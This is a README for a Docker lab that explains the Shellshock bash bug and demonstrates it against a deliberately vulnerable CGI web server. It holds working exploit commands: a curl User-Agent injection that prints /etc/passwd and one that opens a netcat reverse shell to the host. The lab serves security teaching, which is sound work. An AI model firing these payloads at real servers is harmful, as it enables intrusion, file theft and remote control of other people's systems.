forked from https://github.com/tex2e/docker-shellshock-cgi


# Shellshock
This repository consists of a description and a demonstration of the shellshock vulnerablity. The demonstration is based on a docker container containing a CentOS8 linux distribution with a vulnerable bash (v4.3), an Apache2 Webserver and netcat.

## Description of vulnerability
In the standard linx bash it is possible to store not only values but also functions in environment variables. When such functions are stored in environment variables, there is a bug that prevents the parsing process from not terminating after the function ends. Instead, anything entered after the function is executed directly in the current shell environment.

By itself, this bug cannot be abused from the outside. In combination with a webserver and an associated Common Gateway Interface (CGI) this bug becomes dangerous. The CGI interface is used to get e.g. browser specific data from the webserver to an application by the following procedure:


1. the request is sent to the web server 
2. the web server stores general data as environment variables in the current environment
3. the cgi application can get this information by reading the environment variables.

With this behavior, it is possible to send a request to the web server that contains some function-like lines and concatenated code snippets. After parsing the function, the parsing process does not stop and executes the additional code snippets directly in bash


## Demonstration
Prerequisites:
- Docker
- git 
- netcat

### Build and run docker container
1. clone this git repository 
```bash 
$ git clone https://github.com/juuugee/docker-shellshock-cgi.git 
 ```
2. navigate inside the cloned directory
```bash 
$ cd docker-shellshock-cgi/
 ```

3. build docker container: 
``` bash
$ docker build -t seccode/shellshock .
```
4. run docker container: 
``` bash
$ docker run -itd -p 80:80 --privileged --add-host=host.docker.internal:host-gateway --name secode_shellshock seccode/shellshock /sbin/init
``` 
To make sure that the docker container is running, enter the following url in a browser: 

    http://localhost:80


### Attack 1 
(Linux terminal preferred)

With the curl command, send a request to the webserver of the running docker container. 
In this example, the file **etc/passwd** can be accessed and directly printed out:
```bash
$ curl -A "() { :;}; echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://localhost:80/cgi-bin/test.cgi
```

In the command above, the expression *() { :;};* is a empty function which should be parsed into a envrionment variable. Instead of stopping the parsing process the addtional code is being executed, which accessses the **etc/passwd** file and prints it with the **/bin/cat** tool in our console.

### Attack 2
in the second attack a reverse shell is being created. 
1. start netcat listener on the host computer:
```    
$ nc -lp 4545
```
This listener waits for the docker container to connect to it.     

2. Establish a connection:
In a second terminal send the request below to the webserver in the docker container. This leads to a reverse shell.
```
$ curl -A "() { :;}; /bin/bash -c \"nc host.docker.internal 4545 -e /bin/bash\"& " http://localhost:80/cgi-bin/test.cgi
```

After executing this command the netcat listener in the first termimal should display an incoming connection. Now it is possible to enter commands in this terminal which then are directly executed in the docker container. Below are some examples:
```
$ whoami
$ pwd
$ ls
$ cd
...
```

### See Also

- [mubix/shellshocker-pocs: Collection of Proof of Concepts and Potential Targets for #ShellShocker](https://github.com/mubix/shellshocker-pocs)
- [docker-shellshockable/Dockerfile at master · Zenithar/docker-shellshockable](https://github.com/Zenithar/docker-shellshockable/blob/master/Dockerfile)
